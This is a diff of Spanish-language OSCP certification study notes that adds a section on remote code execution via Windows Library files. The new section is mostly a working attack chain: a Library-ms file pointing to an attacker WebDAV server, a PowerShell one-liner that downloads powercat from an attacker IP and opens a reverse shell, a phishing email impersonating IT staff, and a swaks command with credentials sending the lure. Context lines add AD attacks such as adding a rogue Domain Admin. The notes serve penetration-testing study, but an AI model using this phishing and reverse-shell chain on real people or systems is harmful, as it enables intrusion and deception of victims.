@@ -165,57 +165,58 @@ Apuntes para la certificación OSCP.
         * 9.3.3. [Enter-PSSession](#enter-pssession)
         * 9.3.4. [NetExec](#netexec-4)
         * 9.3.5. [Evil-WinRM](#evil-winrm)
-* 10. [Escalación de Privilegios](#escalación-de-privilegios)
-    * 10.1. [Windows](#windows-2)
-        * 10.1.1. [Enumeración](#enumeración)
-        * 10.1.2. [Escalación de Privilegios](#escalación-de-privilegios-1)
-    * 10.2. [Linux](#linux-2)
-        * 10.2.1. [Enumeración](#enumeración-1)
-        * 10.2.2. [Escalación de Privilegios](#escalación-de-privilegios-2)
-    * 10.3. [Técnicas de explotación de trabajos Cron](#técnicas-de-explotación-de-trabajos-cron)
-* 11. [Active Directory](#active-directory)
-    * 11.1. [PowerShell para gestionar Active Directory](#powershell-para-gestionar-active-directory)
-        * 11.1.1. [Importar módulo de Active Directory](#importar-módulo-de-active-directory)
-        * 11.1.2. [Sistema](#sistema)
-        * 11.1.3. [Usuarios](#usuarios)
-        * 11.1.4. [Grupos](#grupos)
-        * 11.1.5. [Trusts (Confianzas)](#trusts-(confianzas))
-        * 11.1.6. [Computadoras](#computadoras)
-        * 11.1.7. [Unidades Organizativas](#unidades-organizativas)
-        * 11.1.8. [GPO (Group Policy Object)](#gpo-(group-policy-object))
-    * 11.2. [Habilitar DONT-REQ-PRE-AUTH](#habilitar-dont-req-pre-auth)
-    * 11.3. [Deshabilitar DONT-REQ-PRE-AUTH](#deshabilitar-dont-req-pre-auth)
-    * 11.4. [Enumeración](#enumeración-2)
-        * 11.4.1. [Kerbrute](#kerbrute)
-        * 11.4.2. [Password Spraying](#password-spraying)
-        * 11.4.3. [BloodHound](#bloodhound)
-        * 11.4.4. [ldapsearch](#ldapsearch)
-        * 11.4.5. [ldapdomaindump](#ldapdomaindump)
-        * 11.4.6. [NetExec - LDAP](#netexec---ldap)
-    * 11.5. [Grupos Privilegiados](#grupos-privilegiados)
-        * 11.5.1. [Account Operators](#account-operators)
-        * 11.5.2. [Server Operators](#server-operators)
-        * 11.5.3. [DnsAdmins](#dnsadmins)
-        * 11.5.4. [Backup Operators](#backup-operators)
-    * 11.6. [Kerberos](#kerberos)
-        * 11.6.1. [¿Qué es Kerberos?](#¿qué-es-kerberos?)
-        * 11.6.2. [AS-REPRoasting](#as-reproasting)
-        * 11.6.3. [Kerberoasting](#kerberoasting)
-    * 11.7. [Movimiento Lateral](#movimiento-lateral-1)
-    * 11.8. [Post Explotación](#post-explotación)
-* 12. [Apéndice](#apéndice)
-    * 12.1. [🛡️ Permisos delegables en Active Directory](#🛡️-permisos-delegables-en-active-directory)
-    * 12.2. [🎯 Flags de userAccountControl (AD)](#🎯-flags-de-useraccountcontrol-(ad))
-* 13. [Herramientas y Recursos](#herramientas-y-recursos)
-    * 13.1. [Pivoting](#pivoting-1)
-    * 13.2. [Information Gathering](#information-gathering-1)
-    * 13.3. [Web](#web-1)
-    * 13.4. [Bases de datos](#bases-de-datos)
-    * 13.5. [Passwords Attacks](#passwords-attacks-1)
-    * 13.6. [Wordlists](#wordlists)
-    * 13.7. [Active Directory](#active-directory-1)
-    * 13.8. [Escalación de Privilegios](#escalación-de-privilegios-3)
-    * 13.9. [Recursos y Blogs](#recursos-y-blogs)
+* 10. [Ejecución remota de código via Windows Library Files](#ejecución-remota-de-código-via-windows-library-files)
+* 11. [Escalación de Privilegios](#escalación-de-privilegios)
+    * 11.1. [Windows](#windows-2)
+        * 11.1.1. [Enumeración](#enumeración)
+        * 11.1.2. [Escalación de Privilegios](#escalación-de-privilegios-1)
+    * 11.2. [Linux](#linux-2)
+        * 11.2.1. [Enumeración](#enumeración-1)
+        * 11.2.2. [Escalación de Privilegios](#escalación-de-privilegios-2)
+    * 11.3. [Técnicas de explotación de trabajos Cron](#técnicas-de-explotación-de-trabajos-cron)
+* 12. [Active Directory](#active-directory)
+    * 12.1. [PowerShell para gestionar Active Directory](#powershell-para-gestionar-active-directory)
+        * 12.1.1. [Importar módulo de Active Directory](#importar-módulo-de-active-directory)
+        * 12.1.2. [Sistema](#sistema)
+        * 12.1.3. [Usuarios](#usuarios)
+        * 12.1.4. [Grupos](#grupos)
+        * 12.1.5. [Trusts (Confianzas)](#trusts-(confianzas))
+        * 12.1.6. [Computadoras](#computadoras)
+        * 12.1.7. [Unidades Organizativas](#unidades-organizativas)
+        * 12.1.8. [GPO (Group Policy Object)](#gpo-(group-policy-object))
+    * 12.2. [Habilitar DONT-REQ-PRE-AUTH](#habilitar-dont-req-pre-auth)
+    * 12.3. [Deshabilitar DONT-REQ-PRE-AUTH](#deshabilitar-dont-req-pre-auth)
+    * 12.4. [Enumeración](#enumeración-2)
+        * 12.4.1. [Kerbrute](#kerbrute)
+        * 12.4.2. [Password Spraying](#password-spraying)
+        * 12.4.3. [BloodHound](#bloodhound)
+        * 12.4.4. [ldapsearch](#ldapsearch)
+        * 12.4.5. [ldapdomaindump](#ldapdomaindump)
+        * 12.4.6. [NetExec - LDAP](#netexec---ldap)
+    * 12.5. [Grupos Privilegiados](#grupos-privilegiados)
+        * 12.5.1. [Account Operators](#account-operators)
+        * 12.5.2. [Server Operators](#server-operators)
+        * 12.5.3. [DnsAdmins](#dnsadmins)
+        * 12.5.4. [Backup Operators](#backup-operators)
+    * 12.6. [Kerberos](#kerberos)
+        * 12.6.1. [¿Qué es Kerberos?](#¿qué-es-kerberos?)
+        * 12.6.2. [AS-REPRoasting](#as-reproasting)
+        * 12.6.3. [Kerberoasting](#kerberoasting)
+    * 12.7. [Movimiento Lateral](#movimiento-lateral-1)
+    * 12.8. [Post Explotación](#post-explotación)
+* 13. [Apéndice](#apéndice)
+    * 13.1. [🛡️ Permisos delegables en Active Directory](#🛡️-permisos-delegables-en-active-directory)
+    * 13.2. [🎯 Flags de userAccountControl (AD)](#🎯-flags-de-useraccountcontrol-(ad))
+* 14. [Herramientas y Recursos](#herramientas-y-recursos)
+    * 14.1. [Pivoting](#pivoting-1)
+    * 14.2. [Information Gathering](#information-gathering-1)
+    * 14.3. [Web](#web-1)
+    * 14.4. [Bases de datos](#bases-de-datos)
+    * 14.5. [Passwords Attacks](#passwords-attacks-1)
+    * 14.6. [Wordlists](#wordlists)
+    * 14.7. [Active Directory](#active-directory-1)
+    * 14.8. [Escalación de Privilegios](#escalación-de-privilegios-3)
+    * 14.9. [Recursos y Blogs](#recursos-y-blogs)
 
 <!-- vscode-markdown-toc-config
 	numbering=true
@@ -2925,11 +2926,166 @@ Una vez instalado, podemos usar `evil-winrm` para conectarse a una máquina Wind
 evil-winrm -i 192.168.56.10 -u elliot -p Password123
 ```
 
-##  10. <a name='escalación-de-privilegios'></a>Escalación de Privilegios
+##  10. <a name='ejecución-remota-de-código-via-windows-library-files'></a>Ejecución remota de código via Windows Library Files
 
-###  10.1. <a name='windows-2'></a>Windows
+En primer lugar, instalamos la libreria `wsgidav` el cual nos permitira crear una instancia de uns servidor webdav en Python.
 
-####  10.1.1. <a name='enumeración'></a>Enumeración
+```c
+pip3 install wsgidav
+```
+
+Luego, en una máquina auxiliar linux creamos el archivo de libreria.
+
+Abrimos el editor Visual Studio Code y creamos un nuevo archivo.
+
+Lo guardamos con el nombre de **config.Library-ms**
+
+![](/img/vscode-config-Library.png)
+
+Luego, pegamos el siguiente código en el archivo:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://192.168.45.164</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+```
+
+> Cambiar la IP por la de nuestra máquina atacante.
+
+![](/img/vscode-config-Library2.png)
+
+
+Creemos el acceso directo en el escritorio para el _usuario de offsec_ . Para esto, haremos clic derecho en el escritorio y haremos clic en _Nuevo_ y luego en _Atajo_ . En la _ventana Crear acceso directo_ , podemos ingresar una ruta a un programa junto con argumentos, que serán señalados por el atajo. Apuntaremos el acceso directo a PowerShell y usaremos otro descargue la base para cargar PowerCat desde nuestra máquina Kali e inicie un reverse shell.
+
+Usaremos el comando que aprovechamos anteriormente:
+
+```
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.175:8000/powercat.ps1');powercat -c 192.168.45.175 -p 443 -e powershell"
+```
+
+Ingresaremos este comando en el campo de entrada y haremos clic _en Siguiente_.
+
+> En la siguiente ventana, ingresemos **automatic_configuration** como nombre del archivo de acceso directo y haga clic en _Finalizar_ para crear el archivo.
+
+En nuestra máquina Kali, iniciemos un servidor web Python3 en el puerto 8000 donde **powercat.ps1** se encuentra e iniciar un oyente Netcat en el puerto 4444.
+
+Para confirmar que la base de descarga y el PowerCat funciona, hagamos doble clic en el archivo de acceso directo en el escritorio. Después de confirmar que queremos ejecutar la aplicación en el cuadro que aparece ventana, el oyente Netcat debería recibir un shell inverso.
+
+![](/img/RCE-windows-Library.png)
+
+El pretexto es un aspecto importante de este ataque del lado del cliente. En este caso podríamos decirle al objetivo que somos un nuevo miembro del equipo de TI. y necesitamos configurar todos los sistemas del cliente para la gestión de la nueva plataforma. También les diremos que hemos incluido un fácil de usar programa de configuración. Un correo electrónico de ejemplo para utilizar en una evaluación real se muestra a continuación.
+
+```
+Hello! My name is Elliot, and I'm a new member of the IT Team. 
+
+This week I am completing some configurations we rolled out last week.
+To make this easier, I've attached a file that will automatically
+perform each step. Could you download the attachment, open the
+directory, and double-click "automatic_configuration"? Once you
+confirm the configuration in the window that appears, you're all done!
+
+If you have any questions, or run into any problems, please let me
+know!
+```
+
+Debemos traer el archivo config.Library-ms a nuestra máquina para tramitarlo en base64 a través del mail
+
+```bash
+base64 config.Library-ms > config.txt
+```
+
+Nos ponemos en escucha con netcat por el puerto elegido, en este caso el 4444.
+
+```bash
+rlwrap nc -lnvp 4444
+```
+
+Creamos el servido webdav:
+
+```bash
+wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/d4redevil/Desktop/OffSec/OSCP/webdav
+```
+
+> Tener en cuenta que en este directorio debe estar el archivo .lnk
+
+Creamos el servidor HTTP con Python para compartir powercat.ps1
+
+```bash
+python3 -m http.server 8000
+```
+
+```c
+echo "192.168.198.189 eMAIL.relia.com" >> /etc/hosts
+```
+
+Enviamos el mail
+
+```c
+swaks -t jim@relia.com --from maildmz@relia.com --attach config.Library-ms --server 192.168.198.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap --auth-user maildmz --auth-password DPuBT9tGCBrTbR
+```
+
+```c
+swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.198.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap --auth-user maildmz --auth-password DPuBT9tGCBrTbR
+=== Trying 192.168.198.189:25...
+=== Connected to 192.168.198.189.
+<-  220 MAIL ESMTP
+ -> EHLO kali
+<-  250-MAIL
+<-  250-SIZE 20480000
+<-  250-AUTH LOGIN
+<-  250 HELP
+ -> AUTH LOGIN
+<-  334 VXNlcm5hbWU6
+ -> bWFpbGRteg==
+<-  334 UGFzc3dvcmQ6
+ -> RFB1QlQ5dEdDQnJUYlI=
+<-  235 authenticated.
+ -> MAIL FROM:<maildmz@relia.com>
+<-  250 OK
+ -> RCPT TO:<jim@relia.com>
+<-  250 OK
+ -> DATA
+<-  354 OK, send.
+ -> 34 lines sent
+<-  250 Queued (8.438 seconds)
+ -> QUIT
+<-  221 goodbye
+=== Connection closed with remote host.
+```
+
+Recibimos la conexión y ganamos acceso a la máquina objetivo.
+
+![](/img/RCE-windows-Library2.png)
+
+![](/img/RCE-windows-Library3.png)
+
+>Los archivos automatic_configuration, config.Library-ms, body.txt y powercat.ps1 deben estar en la carpeta webdav.
+
+Ganamos acceso a la máquina objetivo.
+
+![](/img/RCE-windows-Library4.png)
+
+##  11. <a name='escalación-de-privilegios'></a>Escalación de Privilegios
+
+###  11.1. <a name='windows-2'></a>Windows
+
+####  11.1.1. <a name='enumeración'></a>Enumeración
 
 ##### Sistema
 
@@ -3222,7 +3378,7 @@ reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlo
 - [SharpUp](https://github.com/GhostPack/SharpUp)
 - [Seatbelt](https://github.com/GhostPack/Seatbelt)
 
-####  10.1.2. <a name='escalación-de-privilegios-1'></a>Escalación de Privilegios
+####  11.1.2. <a name='escalación-de-privilegios-1'></a>Escalación de Privilegios
 
 ##### AlwaysInstallElevated
 
@@ -4119,9 +4275,9 @@ También podemos utilizar `SeTakeOwnershipPrivilege` para modificar la propiedad
 
     Tras asumir la propiedad, modificamos los permisos para obtener control total. Ahora podemos modificar los valores de la clave para ejecutar código malicioso, iniciar servicios con privilegios de SYSTEM o agregar nuevas entradas de inicio.
 
-###  10.2. <a name='linux-2'></a>Linux
+###  11.2. <a name='linux-2'></a>Linux
 
-####  10.2.1. <a name='enumeración-1'></a>Enumeración
+####  11.2.1. <a name='enumeración-1'></a>Enumeración
 
 ##### Sistema
 
@@ -4277,7 +4433,7 @@ su - root2
 - [Linux Exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)
 
 
-####  10.2.2. <a name='escalación-de-privilegios-2'></a>Escalación de Privilegios
+####  11.2.2. <a name='escalación-de-privilegios-2'></a>Escalación de Privilegios
 
 > Referencias: https://gtfobins.github.io/
 
@@ -4455,7 +4611,7 @@ Para ver los trabajos cron de todo el sistema, podemos verificar los archivos en
 
 ###### Explotación de tareas cron
 
-###  10.3. <a name='técnicas-de-explotación-de-trabajos-cron'></a>Técnicas de explotación de trabajos Cron
+###  11.3. <a name='técnicas-de-explotación-de-trabajos-cron'></a>Técnicas de explotación de trabajos Cron
 
 | Técnica                          | Descripción                                                                                   |
 |----------------------------------|-----------------------------------------------------------------------------------------------|
@@ -4978,13 +5134,13 @@ elliot@debian:~$ ./exploit-2 /usr/bin/sudo
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-##  11. <a name='active-directory'></a>Active Directory
+##  12. <a name='active-directory'></a>Active Directory
 
-###  11.1. <a name='powershell-para-gestionar-active-directory'></a>PowerShell para gestionar Active Directory
+###  12.1. <a name='powershell-para-gestionar-active-directory'></a>PowerShell para gestionar Active Directory
 
 Listado de Cmdlets utiles para realizar operaciones y enumeración básica en Active Directory.
 
-####  11.1.1. <a name='importar-módulo-de-active-directory'></a>Importar módulo de Active Directory
+####  12.1.1. <a name='importar-módulo-de-active-directory'></a>Importar módulo de Active Directory
 
 Para utilizar la mayoria de los Cmdlets listados a continuación, debemos importar en primer lugar el modulo `ActiveDirectory`.
 
@@ -4992,7 +5148,7 @@ Para utilizar la mayoria de los Cmdlets listados a continuación, debemos import
 Import-Module ActiveDirectory
 ```
 
-####  11.1.2. <a name='sistema'></a>Sistema
+####  12.1.2. <a name='sistema'></a>Sistema
 
 ##### Obtener Variables de entorno
 
@@ -5040,7 +5196,7 @@ Get-MpComputerStatus
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 ```
 
-####  11.1.3. <a name='usuarios'></a>Usuarios
+####  12.1.3. <a name='usuarios'></a>Usuarios
 
 ##### Crear un nuevo usuario
 
@@ -5124,7 +5280,7 @@ Unlock-ADAccount -Identity "NombreUsuario"
 Get-ADUser -Identity "NombreUsuario" -Properties *
 ```
 
-####  11.1.4. <a name='grupos'></a>Grupos
+####  12.1.4. <a name='grupos'></a>Grupos
 
 ##### Crear un nuevo grupo
 ```powershell
@@ -5164,7 +5320,7 @@ Get-ADGroup -Filter * -SearchBase "OU=NombreOU,DC=dominio,DC=com"
 ```powershell
 Get-ADGroupMember -Identity "NombreGrupo"
 ```
-####  11.1.5. <a name='trusts-(confianzas)'></a>Trusts (Confianzas)
+####  12.1.5. <a name='trusts-(confianzas)'></a>Trusts (Confianzas)
 
 ##### Verificar las relaciones de confianza de dominio
 
@@ -5173,7 +5329,7 @@ Get-ADTrust -Filter *
 ```
 Este cmdlet imprimirá las relaciones de confianza que tenga el dominio. Podemos determinar si son confianzas dentro de nuestro bosque o con dominios de otros bosques, el tipo de confianza, la dirección de la confianza y el nombre del dominio con el que está la relación.
 
-####  11.1.6. <a name='computadoras'></a>Computadoras
+####  12.1.6. <a name='computadoras'></a>Computadoras
 
 ##### Obtener información detallada de un equipo
 
@@ -5222,7 +5378,7 @@ Enable-ADAccount -Identity "NombreEquipo"
 Remove-ADComputer -Identity "NombreEquipo"
 ```
 
-####  11.1.7. <a name='unidades-organizativas'></a>Unidades Organizativas
+####  12.1.7. <a name='unidades-organizativas'></a>Unidades Organizativas
 
 ##### Crear una nueva Unidad Organizativa
 
@@ -5248,7 +5404,7 @@ Get-ADOrganizationalUnit -Filter *
 Move-ADObject -Identity "CN=NombreEquipo,OU=Origen,DC=dominio,DC=com" -TargetPath "OU=Destino,DC=dominio,DC=com"
 ```
 
-####  11.1.8. <a name='gpo-(group-policy-object)'></a>GPO (Group Policy Object)
+####  12.1.8. <a name='gpo-(group-policy-object)'></a>GPO (Group Policy Object)
 
 ##### Obtener una lista de todas las GPO
 
@@ -5316,7 +5472,7 @@ Para restaurar desde una copia de seguridad:
 Restore-GPO -Name "NombreGPO" -Path "C:\Ruta\Backup"
 ```
 
-###  11.2. <a name='habilitar-dont-req-pre-auth'></a>Habilitar DONT-REQ-PRE-AUTH
+###  12.2. <a name='habilitar-dont-req-pre-auth'></a>Habilitar DONT-REQ-PRE-AUTH
 
 ```powershell
 # Nombre del usuario a modificar
@@ -5338,18 +5494,18 @@ Set-ADUser -Identity $user -Replace @{userAccountControl=$newUAC}
 (Get-ADUser -Identity $user -Properties userAccountControl).userAccountControl
 ```
 
-###  11.3. <a name='deshabilitar-dont-req-pre-auth'></a>Deshabilitar DONT-REQ-PRE-AUTH
+###  12.3. <a name='deshabilitar-dont-req-pre-auth'></a>Deshabilitar DONT-REQ-PRE-AUTH
 
 ```powershell
 $newUAC = $u.userAccountControl -band -bnot 0x400000
 Set-ADUser -Identity $user -Replace @{userAccountControl=$newUAC}
 ```
 
-###  11.4. <a name='enumeración-2'></a>Enumeración
+###  12.4. <a name='enumeración-2'></a>Enumeración
 
 Si no tenemos un usuario con el que empezar las pruebas (que suele ser el caso), tendremos que encontrar una manera de establecer un punto de apoyo en el dominio, ya sea obteniendo credenciales en texto claro o un hash de contraseña NTLM para un usuario, un shell SYSTEM en un host unido al dominio, o un shell en el contexto de una cuenta de usuario de dominio. Obtener un usuario válido con credenciales es crítico en las primeras etapas de una prueba de penetración interna. Este acceso (incluso al nivel más bajo) abre muchas oportunidades para realizar enumeraciones e incluso ataques.
 
-####  11.4.1. <a name='kerbrute'></a>Kerbrute
+####  12.4.1. <a name='kerbrute'></a>Kerbrute
 
 [Kerbrute](https://github.com/ropnop/kerbrute) puede ser una opción más sigilosa para la enumeración de cuentas de dominio. Se aprovecha del hecho de que los fallos de pre-autenticación Kerberos a menudo no activan registros o alertas. Utilizaremos Kerbrute junto con las listas de usuarios como pueden ser **jsmith.txt** o **jsmith2.txt** de [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames). Este repositorio contiene muchas listas de usuarios diferentes que pueden ser extremadamente útiles cuando se intenta enumerar usuarios cuando se comienza desde una perspectiva no autenticada. Podemos apuntar Kerbrute al DC y alimentarlo con una lista de palabras. La herramienta es rápida, y se nos proporcionarán resultados que nos permitirán saber si las cuentas encontradas son válidas o no, lo cual es un gran punto de partida para lanzar ataques como el de Password Spraying.
 
@@ -5368,7 +5524,7 @@ kerbrute bruteuser --d HACKLAB.LOCAL -dc 192.168.56.10 jsmith.txt thomas.brown
 Otras herramientas a tener en cuenta son [RPCClient](#426-rpcclient) y [Enum4Linux](#424-enum4linux).
 
 
-####  11.4.2. <a name='password-spraying'></a>Password Spraying
+####  12.4.2. <a name='password-spraying'></a>Password Spraying
 
 Otro aspecto destacable es el ataque conocido como Password Spraying. Para contextualizar, imaginemos que disponemos de unas credenciales como `thomas.brown:MySup3erPass123!`. Una táctica común en este escenario es conectarse al Protocolo de Llamada a Procedimientos Remotos (RPC) - para extraer una lista de todos los usuarios del dominio. Esta lista se guarda en un archivo, por ejemplo users.txt, y luego se proporciona como entrada a herramientas como el propio netexec, junto con la contraseña antes mencionada. Este proceso permite intentar el acceso a múltiples cuentas del dominio, aprovechando la débil seguridad de la contraseña utilizada.
 
@@ -5384,7 +5540,7 @@ nxc smb 192.168.56.10 -u users.txt -p passwords.txt --continue-on-success --no-b
 
 El argumento `--no-bruteforce` se emplea para evitar la prueba de todas las contraseñas disponibles para cada usuario, en su lugar, se prueba el usuario de la línea 1 con la contraseña de la línea 1, el usuario de la línea 2 con la contraseña de la línea 2, y así sucesivamente.
 
-####  11.4.3. <a name='bloodhound'></a>BloodHound
+####  12.4.3. <a name='bloodhound'></a>BloodHound
 
 ##### Opción 1
 
@@ -5427,7 +5583,7 @@ Otra alternativa es utilizar [SharpHound.exe](https://github.com/SpecterOps/Bloo
 
 Por ultimo, descargamos el archivo `zip` nuevamente y los subimos en `BloodHound`.
 
-####  11.4.4. <a name='ldapsearch'></a>ldapsearch
+####  12.4.4. <a name='ldapsearch'></a>ldapsearch
 Para enumerar a través del protoclo LDAP, podemos usar la herramienta `ldapsearch`:
 
 ```bash
@@ -5449,7 +5605,7 @@ ldapsearch -H ldap://192.168.56.10 -D 'thomas.brown@HACKLAB.local' -w 'MySup3erP
 ldapsearch -H ldap://192.168.56.10 -D 'thomas.brown@HACKLAB.local' -w 'MySup3erPass123!' -x -s base -b "DC=HACKLAB,DC=LOCAL" "(objectClass=*)" "*" +
 ```
 
-####  11.4.5. <a name='ldapdomaindump'></a>ldapdomaindump
+####  12.4.5. <a name='ldapdomaindump'></a>ldapdomaindump
 
 En caso de tener credenciales válidas podemos hacer uso de `ldapdomaindump`:
 
@@ -5459,7 +5615,7 @@ ldapdomaindump -u 'HACKLAB.local\thomas.brown' -p 'Password123' 192.168.56.10
 
 Esto generará unos archivos `json`, `grep`, `html` que con un servidor web podemos ver en el navegador.
 
-####  11.4.6. <a name='netexec---ldap'></a>NetExec - LDAP
+####  12.4.6. <a name='netexec---ldap'></a>NetExec - LDAP
 
 ```bash
 netexec ldap <RHOST> -u '' -p '' -M -user-desc
@@ -5484,9 +5640,9 @@ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c
 netexec ldap <RHOST> -u '<USERNAME>' --use-kcache --bloodhound --dns-tcp --dns-server <RHOST> -c All
 ```
 
-###  11.5. <a name='grupos-privilegiados'></a>Grupos Privilegiados
+###  12.5. <a name='grupos-privilegiados'></a>Grupos Privilegiados
 
-####  11.5.1. <a name='account-operators'></a>Account Operators
+####  12.5.1. <a name='account-operators'></a>Account Operators
 
 Es un grupo incorporado de Active Directory pensado para delegar la gestión de cuentas de usuarios y grupos estándar, sin dar acceso completo de administración del dominio.
 
@@ -5572,7 +5728,7 @@ Import-module .\PowerView.ps1
 Set-DomainObject -Identity tyrell.wellick -SET @{serviceprincipalname='nonexistent/FAKE'}
 ```
 
-####  11.5.2. <a name='server-operators'></a>Server Operators
+####  12.5.2. <a name='server-operators'></a>Server Operators
 
 Es un grupo buit-in en los controladores de dominio (DC) que tiene privilegios para administrar servidores, pero no es un grupo administrativo a nivel dominio como Domain Admins.
 
@@ -5611,7 +5767,7 @@ net localgroup administrators hacker /add
 
 Podemos escribir en `C:\Windows\Tasks`, lo que se puede usar para ejecución diferida o persistencia.
 
-####  11.5.3. <a name='dnsadmins'></a>DnsAdmins
+####  12.5.3. <a name='dnsadmins'></a>DnsAdmins
 
 Los usuarios que son miembros del grupo **DnsAdmins** tienen la capacidad de abusar de una característica del protocolo de gestión DNS de Microsoft para hacer que el servidor DNS cargue cualquier DLL especificada. El servicio que a su vez, ejecuta la DLL se realiza en el contexto de SYSTEM y podría utilizarse en un controlador de dominio (desde donde se ejecuta DNS normalmente) para obtener privilegios de administrador de dominio.
 
@@ -5693,15 +5849,15 @@ Bloodhound
     net user hacker Password123! /add && net group "Domain Admins" /add hacker
     ```
 
-####  11.5.4. <a name='backup-operators'></a>Backup Operators
+####  12.5.4. <a name='backup-operators'></a>Backup Operators
 
 Ver [BackupOperators - SeBackupPrivilege y SeRestorePrivilege](#backupoperators---sebackupprivilege-y-serestoreprivilege).
 
-###  11.6. <a name='kerberos'></a>Kerberos
+###  12.6. <a name='kerberos'></a>Kerberos
 
 ![Kerberos](./img/kerberos.webp)
 
-####  11.6.1. <a name='¿qué-es-kerberos?'></a>¿Qué es Kerberos?
+####  12.6.1. <a name='¿qué-es-kerberos?'></a>¿Qué es Kerberos?
 
 Kerberos es un protocolo de **autenticación**, pero no de autorización. Esto significa que su función es verificar la identidad de un usuario mediante una contraseña conocida solo por él, sin definir a qué recursos o servicios puede acceder.  
 
@@ -5769,7 +5925,7 @@ A continuación se muestra un resumen de los mensajes siguiendo la secuencia de 
 
 ![Kerberos Flow](./img/kerberos_flow.png)
 
-####  11.6.2. <a name='as-reproasting'></a>AS-REPRoasting
+####  12.6.2. <a name='as-reproasting'></a>AS-REPRoasting
 
 **AS-REPRoasting** es uno de los ataques más básicos contra Kerberos y tiene como objetivo cuentas sin **preautenticación habilitada**. Aunque es poco común en entornos bien configurados, es uno de los pocos ataques de Kerberos que **no requiere autenticación previa**.  
 
@@ -5824,7 +5980,7 @@ john --wordlist=rockyou.txt hashes.asreproast
 
 - Revisión de políticas de seguridad.
 
-####  11.6.3. <a name='kerberoasting'></a>Kerberoasting  
+####  12.6.3. <a name='kerberoasting'></a>Kerberoasting  
 
 > Un **Service Principal Name (SPN)** es un identificador único de una instancia de servicio. Los SPN son utilizados por la autenticación Kerberos para asociar una instancia de servicio con una cuenta de inicio de sesión de servicio.  
 > — [MSDN](https://docs.microsoft.com/windows/desktop/AD/service-principal-names)  
@@ -5897,13 +6053,13 @@ Set-DomainObject -Identity <USER> -SET @{serviceprincipalname='nonexistent/BLAHB
 
 - No ejecutar las cuentas de Servicio como Administrador del Dominio.
 
-###  11.7. <a name='movimiento-lateral-1'></a>Movimiento Lateral
+###  12.7. <a name='movimiento-lateral-1'></a>Movimiento Lateral
 
-###  11.8. <a name='post-explotación'></a>Post Explotación
+###  12.8. <a name='post-explotación'></a>Post Explotación
 
-##  12. <a name='apéndice'></a>Apéndice
+##  13. <a name='apéndice'></a>Apéndice
 
-###  12.1. <a name='🛡️-permisos-delegables-en-active-directory'></a>🛡️ Permisos delegables en Active Directory
+###  13.1. <a name='🛡️-permisos-delegables-en-active-directory'></a>🛡️ Permisos delegables en Active Directory
 
 | Permiso               | Descripción                                                                    |
 | --------------------- | ------------------------------------------------------------------------------ |
@@ -5915,7 +6071,7 @@ Set-DomainObject -Identity <USER> -SET @{serviceprincipalname='nonexistent/BLAHB
 | `ForceChangePassword` | Puede cambiar la contraseña del objeto sin conocer la actual.                  |
 | `Self`                | Puede agregarse a sí mismo en ciertos atributos, como por ejemplo, a un grupo. |
 
-###  12.2. <a name='🎯-flags-de-useraccountcontrol-(ad)'></a>🎯 Flags de userAccountControl (AD)
+###  13.2. <a name='🎯-flags-de-useraccountcontrol-(ad)'></a>🎯 Flags de userAccountControl (AD)
 
 | Flag Name                        | Valor (Decimal) | Valor (Hexadecimal) | Descripción                                                                  |
 |----------------------------------|------------------|----------------------|----------------------------------------------------------------------------|
@@ -5945,23 +6101,23 @@ Set-DomainObject -Identity <USER> -SET @{serviceprincipalname='nonexistent/BLAHB
 > 💡 Podemos combinar múltiples flags con OR binario (`-bor`) y removerlas con AND + NOT (`-band -bnot`).
 
 
-##  13. <a name='herramientas-y-recursos'></a>Herramientas y Recursos
+##  14. <a name='herramientas-y-recursos'></a>Herramientas y Recursos
 
 Enlaces a las distintas herramientas y recursos.
-###  13.1. <a name='pivoting-1'></a>Pivoting
+###  14.1. <a name='pivoting-1'></a>Pivoting
 
 | Nombre    | URL                                                                      |
 | --------- | ------------------------------------------------------------------------ |
 | Chisel    | [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) |
 | Ligolo-ng | https://github.com/nicocha30/ligolo-ng |
                             
-###  13.2. <a name='information-gathering-1'></a>Information Gathering
+###  14.2. <a name='information-gathering-1'></a>Information Gathering
 
 | Nombre | URL                          |
 | ------ | ---------------------------- |
 | Nmap   | https://github.com/nmap/nmap |
 
-###  13.3. <a name='web-1'></a>Web
+###  14.3. <a name='web-1'></a>Web
 
 | Nombre                     | URL                                                                          |
 | -------------------------- | ---------------------------------------------------------------------------- |
@@ -5979,13 +6135,13 @@ Enlaces a las distintas herramientas y recursos.
 | Git-Dumper                 | https://github.com/arthaud/git-dumper                                        |
 | Extractor                  | https://github.com/internetwache/GitTools/blob/master/Extractor/extractor.sh |
 
-###  13.4. <a name='bases-de-datos'></a>Bases de datos
+###  14.4. <a name='bases-de-datos'></a>Bases de datos
 
 | Nombre                   | URL                            |
 | ------------------------ | ------------------------------ |
 | SQL Injection Cheatsheet | https://tib3rius.com/sqli.html |
 
-###  13.5. <a name='passwords-attacks-1'></a>Passwords Attacks
+###  14.5. <a name='passwords-attacks-1'></a>Passwords Attacks
 
 | Nombre                          | URL                                                                                                        |
 | ------------------------------- | ---------------------------------------------------------------------------------------------------------- |
@@ -6003,7 +6159,7 @@ Enlaces a las distintas herramientas y recursos.
 | ntlm.pw                         | [https://ntlm.pw](https://ntlm.pw)                                                                         |
